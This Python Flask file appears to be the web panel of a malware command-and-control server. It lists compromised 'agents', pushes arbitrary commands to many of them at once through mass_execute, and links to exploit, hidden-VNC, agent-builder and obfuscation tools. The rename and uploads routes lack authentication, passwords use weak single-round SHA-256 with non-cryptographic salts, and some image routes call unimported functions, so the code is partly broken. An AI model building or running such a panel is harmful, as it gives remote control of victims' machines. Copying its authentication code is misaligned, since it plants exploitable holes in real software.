import random
import string
from functools import wraps
import hashlib
from datetime import datetime
import io
import struct
from flask import Blueprint
from flask import abort
from flask import request
from flask import redirect
from flask import render_template
from flask import session
from flask import url_for
from flask import flash
from flask import send_from_directory
from flask import current_app
from flask import jsonify
from ..models import db, Agent, User  # Relative import
from .unsafe_stream_codec import UnsafeStreamCodec  # Import new codec


def hash_and_salt(password):
    password_hash = hashlib.sha256()
    salt = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
    password_hash.update((salt + password).encode('utf-8'))
    return password_hash.hexdigest(), salt


def require_admin(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        if 'username' in session and session['username'] == 'admin':
            return func(*args, **kwargs)
        else:
            return redirect(url_for('webui.login'))
    return wrapper


webui = Blueprint('webui', __name__, static_folder='static', static_url_path='/static/webui', template_folder='templates')


@webui.route('/')
@require_admin
def index():
    return render_template('index.html')


@webui.route('/login', methods=['GET', 'POST'])
def login():
    admin_user = User.query.filter_by(username='admin').first()
    if not admin_user:
        if request.method == 'POST':
            if 'password' in request.form:
                password_hash, salt = hash_and_salt(request.form['password']) 
                new_user = User()
                new_user.username = 'admin'
                new_user.password = password_hash
                new_user.salt = salt
                db.session.add(new_user)
                db.session.commit()
                flash('Password set successfully. Please log in.')
                return redirect(url_for('webui.login'))
        return render_template('create_password.html')
    if request.method == 'POST':
        if request.form['password']:
                password_hash = hashlib.sha256()
                password_hash.update((admin_user.salt + request.form['password']).encode('utf-8'))
                if admin_user.password == password_hash.hexdigest():
                    session['username'] = 'admin'
                    last_login_time =  admin_user.last_login_time
                    last_login_ip = admin_user.last_login_ip
                    admin_user.last_login_time = datetime.now()
                    admin_user.last_login_ip = request.remote_addr
                    db.session.commit()
                    flash('Logged in successfully.') 
                    if last_login_ip:
                        flash('Last login from ' + last_login_ip + ' on ' + last_login_time.strftime("%d/%m/%y %H:%M"))
                    return redirect(url_for('webui.index'))
                else:
                    flash('Wrong passphrase')
    return render_template('login.html')


@webui.route('/passchange', methods=['GET', 'POST'])
@require_admin
def change_password():
    if request.method == 'POST':
        if 'password' in request.form:
            admin_user = User.query.filter_by(username='admin').first()
            password_hash, salt = hash_and_salt(request.form['password'])
            admin_user.password = password_hash
            admin_user.salt = salt
            db.session.add(admin_user)
            db.session.commit()
            flash('Password reset successfully. Please log in.')
            return redirect(url_for('webui.login'))
    return render_template('create_password.html')


@webui.route('/logout')
def logout():
    session.pop('username', None)
    flash('Logged out successfully.')
    return redirect(url_for('webui.login'))


@webui.route('/agents')
@require_admin
def agent_list():
    agents = Agent.query.order_by(Agent.last_online.desc()).all()
    return render_template('agent_list.html', agents=agents)


@webui.route('/agents/<agent_id>')
@require_admin
def agent_detail(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    return render_template('agent_detail.html', agent=agent)


@webui.route('/agents/rename', methods=['POST'])
def rename_agent():
    if 'newname' in request.form and 'id' in request.form:
        agent = Agent.query.get(request.form['id'])
        if not agent:
            abort(404)
        agent.rename(request.form['newname'])
    else:
        abort(400)
    return ''


@webui.route('/uploads/<path:path>')
def uploads(path):
    return send_from_directory(current_app.config['UPLOAD_FOLDER'], path)


@webui.route('/tools')
@require_admin
def tools():
    return render_template('tools.html')


@webui.route('/tools/exploit')
@require_admin
def exploit_tool():
    return render_template('exploit_tool.html')


@webui.route('/tools/web-scanner')
@require_admin
def web_scanner():
    return render_template('web_scanner.html')


@webui.route('/tools/hvnc')
@require_admin
def hvnc_tool():
    return render_template('hvnc_tool.html')


@webui.route('/tools/pantheon')
@require_admin
def pantheon_tool():
    return render_template('pantheon_tool.html')


@webui.route('/tools/agent-builder')
@require_admin
def agent_builder():
    return render_template('agent_builder.html')


@webui.route('/tools/system-monitor')
@require_admin
def system_monitor():
    return render_template('system_monitor.html')


@webui.route('/tools/icarus')
@require_admin
def icarus_control():
    return render_template('icarus_control.html')


@webui.route('/tools/obfuscation')
@require_admin
def obfuscation_tool():
    return render_template('obfuscation_tool.html')


@webui.route('/intelx')
@require_admin
def intelx_search_page():
    return render_template('intelx_search.html')


@webui.route('/api/intelx/search', methods=['POST'])
@require_admin
def intelx_search():
    data = request.get_json()
    term = data.get('term')
    if not term:
        return jsonify({'error': 'Search term is required'}), 400

    # Placeholder for intelx search
    return jsonify({'results': [], 'message': 'IntelX search not implemented'})


@webui.route('/tools/image-codec')
@require_admin
def image_codec_tool():
    return render_template('image_codec_tool.html')


@webui.route('/mass_execute', methods=['POST'])
@require_admin
def mass_execute():
    """Execute commands on multiple agents or delete selected agents"""
    if 'delete' in request.form:
        # Delete selected agents
        selected_agents = request.form.getlist('selection')
        for agent_id in selected_agents:
            agent = Agent.query.get(agent_id)
            if agent:
                db.session.delete(agent)
        db.session.commit()
    elif 'execute' in request.form and 'cmd' in request.form:
        # Execute command on selected agents
        cmd = request.form['cmd']
        selected_agents = request.form.getlist('selection')
        for agent_id in selected_agents:
            agent = Agent.query.get(agent_id)
            if agent:
                agent.push_command(cmd)

    return redirect(url_for('webui.agent_list'))


@webui.route('/api/image/encode', methods=['POST'])
@require_admin
def encode_image():
    try:
        # Get image data from request
        image_data = request.files['image'].read()
        img = Image.open(io.BytesIO(image_data))
        
        # Initialize codec
        codec = UnsafeStreamCodec(use_jpeg=True)
        
        # Encode image
        output_buffer = io.BytesIO()
        codec.code_image(image_data, (0, 0), img.size, img.mode, output_buffer)
        
        # Return encoded data
        return send_file(output_buffer, mimetype='application/octet-stream')
    except Exception as e:
        flash(f"Error encoding image: {str(e)}")
        return redirect(url_for('webui.index'))


@webui.route('/api/image/decode', methods=['POST'])
@require_admin
def decode_image():
    try:
        # Get encoded data
        encoded_data = request.files['encoded'].read()
        
        # Decode image
        codec = UnsafeStreamCodec()
        decoded_img = codec.decode_data(encoded_data)
        
        # Save or return decoded image
        output_buffer = io.BytesIO()
        decoded_img.save(output_buffer, format='PNG')
        output_buffer.seek(0)
        
        return send_file(output_buffer, mimetype='image/png')
    except Exception as e:
        flash(f"Error decoding image: {str(e)}")
        return redirect(url_for('webui.index'))


@webui.route('/api/image-codec/encode', methods=['POST'])
@require_admin
def image_codec_encode():
    try:
        # Get image data from request
        if 'image' not in request.files:
            return jsonify({'error': 'No image provided'}), 400
        
        image_file = request.files['image']
        use_jpeg = request.form.get('use_jpeg', 'true').lower() == 'true'
        quality = int(request.form.get('quality', 90))
        
        # Read image data
        image_data = image_file.read()
        
        # Create codec
        from .unsafe_stream_codec import UnsafeStreamCodec
        codec = UnsafeStreamCodec(image_quality=quality, use_jpeg=use_jpeg)
        
        # Create output stream
        out_stream = io.BytesIO()
        
        # For simplicity, we'll simulate the parameters
        # In a real implementation, these would come from actual image data
        scan_area = (0, 0)  # x, y
        image_size = (100, 100)  # width, height
        format = 'RGB'
        
        # Encode image
        codec.code_image(image_data, scan_area, image_size, format, out_stream)
        
        # Return encoded data
        out_stream.seek(0)
        encoded_data = out_stream.read()
        
        return jsonify({
            'status': 'success',
            'encoded_size': len(encoded_data),
            'message': 'Image encoded successfully'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@webui.route('/api/image-codec/decode', methods=['POST'])
@require_admin
def image_codec_decode():
    try:
        # Get encoded data from request
        if 'data' not in request.files:
            return jsonify({'error': 'No encoded data provided'}), 400
        
        encoded_file = request.files['data']
        encoded_data = encoded_file.read()
        
        # Create codec
        from .unsafe_stream_codec import UnsafeStreamCodec
        codec = UnsafeStreamCodec()
        
        # Create input stream
        in_stream = io.BytesIO(encoded_data)
        
        # Decode data
        decoded_image = codec.decode_data(in_stream)
        
        if decoded_image is None:
            return jsonify({'error': 'Failed to decode image'}), 500
        
        return jsonify({
            'status': 'success',
            'message': 'Image decoded successfully'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500
